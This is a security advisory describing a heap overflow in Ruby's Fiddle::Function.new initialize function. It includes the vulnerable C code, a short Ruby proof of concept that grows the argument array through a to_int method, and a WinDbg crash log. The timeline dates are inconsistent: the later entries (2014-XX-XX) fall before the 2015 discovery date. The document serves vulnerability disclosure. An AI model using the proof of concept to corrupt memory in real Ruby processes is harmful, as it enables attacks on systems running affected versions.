Ruby Fiddle::Function.new "initialize" function Heap Overflow vulernability.

:: Description
	An exploitable heap overflow vulnerability exists in the Fiddle::Function.new "initialize" function functionality of Ruby. 
 In Fiddle::Function.new "initialize" heap buffer "arg_types" allocation is made based on args array length. Specially constructed object passed as element
 of args array can increase this array size after mentioned allocation and cause heap overflow.

:: Tested Versions
Ruby 2.3.0 dev
Ruby 2.2.2

:: Product URLs

https://www.ruby-lang.org


:: Details

Line 86 	static VALUE
Line 87 	initialize(int argc, VALUE argv[], VALUE self)
Line 88 	{
Line 89 		ffi_cif * cif;
Line 90 		ffi_type **arg_types;
Line 91 		ffi_status result;
Line 92 		VALUE ptr, args, ret_type, abi, kwds;
Line 93 		int i;
Line 94 
Line 95 		rb_scan_args(argc, argv, "31:", &ptr, &args, &ret_type, &abi, &kwds);
Line 96 		if(NIL_P(abi)) abi = INT2NUM(FFI_DEFAULT_ABI);
Line 97 
Line 98 		Check_Type(args, T_ARRAY);
Line 99 		Check_Max_Args("args", RARRAY_LENINT(args));
		
				(...)
		
Line 110		arg_types = xcalloc(RARRAY_LEN(args) + 1, sizeof(ffi_type *));
Line 111
Line 112		for (i = 0; i < RARRAY_LEN(args); i++) {
Line 113			int type = NUM2INT(RARRAY_PTR(args)[i]);
Line 114			arg_types[i] = INT2FFI_TYPE(type);
Line 115		}
Line 116		arg_types[RARRAY_LEN(args)] = NULL;

In Line 110 based on lenght of passed by user args array, xcalloc allocates buffer for ffi_type structures. 
Later in for loop we see that each element from this array is first converted to int and later to ffi_type structure.
Results of this conversions are stored in previous allocated array "arg_types".
	Exploiting knowledge that in Line 113 NUM2INT for non Integer object will call "to_int" method we can create properly constructed object which will 
implement this method and it's responsible will be to increase size of args array. Increased size of args array inside for loop just after space
allocation for arg_types will cause during next iteration heap overflow in Line 114 and later in Line 116 during storing another ffi_type structures.
	

:: PoC
require 'fiddle'

$args = []
class MyObject	
	def to_int
		puts "increase size of array"
		(1..10).map{|x| $args.push(1)}
		puts "New args array size is : #{$args.length}"		
		return 1
	end
end
puts "Start"
x = MyObject.new
$args.push(x)
puts "args array size : #{$args.length}"
f = Fiddle::Function.new(nil, $args, Fiddle::TYPE_VOIDP)

:: Crash analysis

(15dc.16b8): Break instruction exception - code 80000003 (first chance)
eax=00000000 ebx=00000000 ecx=bf8d0000 edx=0008e3c8 esi=fffffffe edi=00000000
eip=77b612fb esp=0028fb08 ebp=0028fb34 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
ntdll!LdrpDoDebuggerBreak+0x2c:
77b612fb cc              int     3
0:000> bu fiddle!Init_fiddle
0:000> g
ModLoad: 75dc0000 75e20000   C:\Windows\SysWOW64\IMM32.DLL
ModLoad: 75ce0000 75dac000   C:\Windows\syswow64\MSCTF.dll
ModLoad: 72b10000 72b3b000   C:\Windows\SysWOW64\nvinit.dll
ModLoad: 72b00000 72b09000   C:\Windows\SysWOW64\VERSION.dll
ModLoad: 0f000000 0f006000   C:\Program Files (x86)\NVIDIA Corporation\CoProcManager\detoured.dll
ModLoad: 6e480000 6e4a9000   C:\Program Files (x86)\NVIDIA Corporation\CoProcManager\nvd3d9wrap.dll
ModLoad: 76740000 768dd000   C:\Windows\syswow64\SETUPAPI.dll
ModLoad: 765a0000 765c7000   C:\Windows\syswow64\CFGMGR32.dll
ModLoad: 762c0000 7634f000   C:\Windows\syswow64\OLEAUT32.dll
ModLoad: 76440000 7659c000   C:\Windows\syswow64\ole32.dll
ModLoad: 75490000 754a2000   C:\Windows\syswow64\DEVOBJ.dll
ModLoad: 6e460000 6e47e000   C:\Program Files (x86)\NVIDIA Corporation\CoProcManager\nvdxgiwrap.dll
ModLoad: 72a90000 72aa7000   C:\Windows\SysWOW64\CRYPTSP.dll
ModLoad: 72a50000 72a8b000   C:\Windows\SysWOW64\rsaenh.dll
ModLoad: 71280000 7128c000   C:\Ruby22\lib\ruby\2.2.0\i386-mingw32\enc\encdb.so
ModLoad: 6dd40000 6dd4c000   C:\Ruby22\lib\ruby\2.2.0\i386-mingw32\enc\trans\transdb.so
ModLoad: 6fbc0000 6fbcb000   C:\Ruby22\lib\ruby\2.2.0\i386-mingw32\enc\iso_8859_2.so
ModLoad: 70b40000 70b4c000   C:\Ruby22\lib\ruby\2.2.0\i386-mingw32\thread.so
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Ruby22\lib\ruby\2.2.0\i386-mingw32\fiddle.so -
ModLoad: 70a40000 70a50000   C:\Ruby22\lib\ruby\2.2.0\i386-mingw32\fiddle.so
ModLoad: 6b740000 6b76a000   C:\Ruby22\bin\libffi-6.dll
Breakpoint 0 hit
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Ruby22\bin\msvcrt-ruby220.dll -
eax=70a42270 ebx=70a4b068 ecx=70a40000 edx=70a40000 esi=70a4b4ed edi=64105061
eip=70a42270 esp=0028ee5c ebp=0028f2d8 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
fiddle!Init_fiddle:
70a42270 55              push    ebp
0:000> bp 70A42ADD ".printf \" xcalloc( 0x%x )\",edx;.echo;g "
0:000> bp 70A42AE2 ".printf \"arg_types addr : 0x%x\",eax;.echo"
0:000> g

Start
args array size : 1
 xcalloc( 0x2 )
arg_types addr : 0x2b81b50

eax=02b81b50 ebx=00000000 ecx=75e2f489 edx=00000018 esi=00000003 edi=0035003c
eip=70a42ae2 esp=0028f7a0 ebp=0028f808 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
fiddle!Init_fiddle+0x872:
70a42ae2 89c7            mov     edi,eax
0:000> !heap -p -a 0x2b81b50
    address 02b81b50 found in
    _HEAP @ 510000
      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
        02b81b48 0004 0000  [00]   02b81b50    00008 - (busy)


0:000> !heap -p -a 02b81b48+20
    address 02b81b68 found in
    _HEAP @ 510000
      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
        02b81b68 0290 0000  [00]   02b81b70    01478 - (free)


0:000> dd 02b81b48+20
02b81b68  fad1ca73 000ae511 005100c4 00514668
02b81b78  feeefeee feeefeee feeefeee feeefeee
02b81b88  feeefeee feeefeee feeefeee feeefeee
02b81b98  feeefeee feeefeee feeefeee feeefeee
02b81ba8  feeefeee feeefeee feeefeee feeefeee
02b81bb8  feeefeee feeefeee feeefeee feeefeee
02b81bc8  feeefeee feeefeee feeefeee feeefeee
02b81bd8  feeefeee feeefeee feeefeee feeefeee
0:000> g

increase size of array
New args array size is : 11

HEAP[ruby.exe]: Heap block at 02B81B48 modified at 02B81B58 past requested size of 8
(15dc.16b8): Break instruction exception - code 80000003 (first chance)
eax=02b81b48 ebx=02b81b58 ecx=77b2f861 edx=0028f969 esi=02b81b48 edi=00000008
eip=77b9087c esp=0028fbb0 ebp=0028fbb0 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
ntdll!RtlpBreakPointHeap+0x23:
77b9087c cc              int     3
0:000> !heap -p -a 02b81b48+20
    address 02b81b68 found in
    _HEAP @ 510000
      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
        02b81b68 b8ab 0000  [00]   02b81b70    4c66a - (busy)
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Ruby22\bin\libffi-6.dll -
          libffi_6!ffi_type_pointer


0:000> !heap -x 02b81b48+20
ERROR: Block 02b81b68 previous size 955d does not match previous block size 4
HEAP 00510000 (Seg 02af0000) At 02b81b68 Error: invalid block Previous

0:000> dd 02b81b48+20
02b81b68  6b747048 6b747048 6b747048 6b747048
02b81b78  6b747048 00000000 00000003 00000003
02b81b88  00000003 00000003 00000003 00000003
02b81b98  00000003 baadf00d baadf00d baadf00d
02b81ba8  baadf00d baadf00d baadf00d baadf00d
02b81bb8  baadf00d baadf00d abababab abababab
02b81bc8  00000000 00000000 66d2c8ee 180ae518
02b81bd8  02b6c4d0 02b6c4d0 02b6c4d0 02b6c4d0
0:000> g
HEAP[ruby.exe]: Invalid address specified to RtlSizeHeap( 00510000, 02B81B50 )
(15dc.16b8): Break instruction exception - code 80000003 (first chance)
eax=02b81b48 ebx=02b81b48 ecx=77b2f861 edx=0028f985 esi=00510000 edi=02b81b50
eip=77b9087c esp=0028fbcc ebp=0028fbcc iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
ntdll!RtlpBreakPointHeap+0x23:
77b9087c cc              int     3
0:000> g
HEAP[ruby.exe]: Heap block at 02B81B48 modified at 02B81B58 past requested size of 8
(15dc.16b8): Break instruction exception - code 80000003 (first chance)
eax=02b81b48 ebx=02b81b58 ecx=77b2f861 edx=0028f871 esi=02b81b48 edi=00000008
eip=77b9087c esp=0028fab8 ebp=0028fab8 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
ntdll!RtlpBreakPointHeap+0x23:
77b9087c cc              int     3
0:000> g
HEAP[ruby.exe]: Invalid address specified to RtlFreeHeap( 00510000, 02B81B50 )
(15dc.16b8): Break instruction exception - code 80000003 (first chance)
eax=02b81b48 ebx=02b81b48 ecx=77b2f861 edx=0028f88d esi=00510000 edi=00510000
eip=77b9087c esp=0028fad4 ebp=0028fad4 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
ntdll!RtlpBreakPointHeap+0x23:
77b9087c cc              int     3
0:000> g
eax=00000000 ebx=00000000 ecx=0028f88c edx=0028f88d esi=77bc2100 edi=77bc20c0
eip=77adfd0e esp=0028fe40 ebp=0028fe5c iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
ntdll!ZwTerminateProcess+0x12:
77adfd0e 83c404          add     esp,4
0:000>

:: Credit 

Discovered by Marcin ‘Icewall’ Noga

:: Timeline

2015-06-11 - Initial Discovery 
2014-XX-XX - Vendor Notification
2014-XX-XX - Patch Released
2014-XX-XX - Public Disclosure